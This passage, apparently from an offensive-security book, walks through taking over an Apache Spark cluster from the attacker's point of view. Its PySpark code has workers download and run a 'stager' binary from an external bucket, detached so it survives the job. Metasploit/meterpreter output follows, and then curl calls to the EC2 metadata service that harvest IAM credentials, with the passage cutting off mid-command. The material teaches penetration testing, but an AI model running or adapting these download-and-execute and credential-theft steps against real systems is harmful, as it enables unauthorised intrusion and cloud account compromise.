# Spark Takeover

To keep our malicious app in play, we want to diligently instruct Linux to spawn it in its own process group, in order to ignore interrupt signals sent by the JVM when the job is done. We also want the driver to wait a few seconds, until our app finishes establishing a stable connection to our attacking infrastructure. We need to add these lines to our app:

```
--snip--
finalist = partlist.map(
    lambda x: subprocess.Popen(
        "wget https://gretsch-spark-eu.s3.amazonaws.com/stager && chmod +x ./stager && ./stager &",
        shell=True,
        preexec_fn=os.setpgrp,
    )
)
finalist.collect()
time.sleep(10)

$ python reverse_app.py
--snip--
```

On our attacking infrastructure, we open Metasploit and wait for the app to ring back home:

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > sessions -i 7
[*] Starting interaction with 7...

meterpreter > execute -i -f id
Process 4638 created.
Channel 1 created.

① uid=1000(spark) gid=1000(spark)
groups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadm in),116(sambashare)...
```

Fantastic! We made it to one of the workers. We’re running as a regular Spark user ①, which was trusted enough to be included in the sudo group. No complaints from this side of the screen. Let’s explore this new entourage by dumping environment variables, mounted folders, IAM roles, or anything else that might be useful:

```
meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials

spark-standalone.ec2

meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials/spark-\
```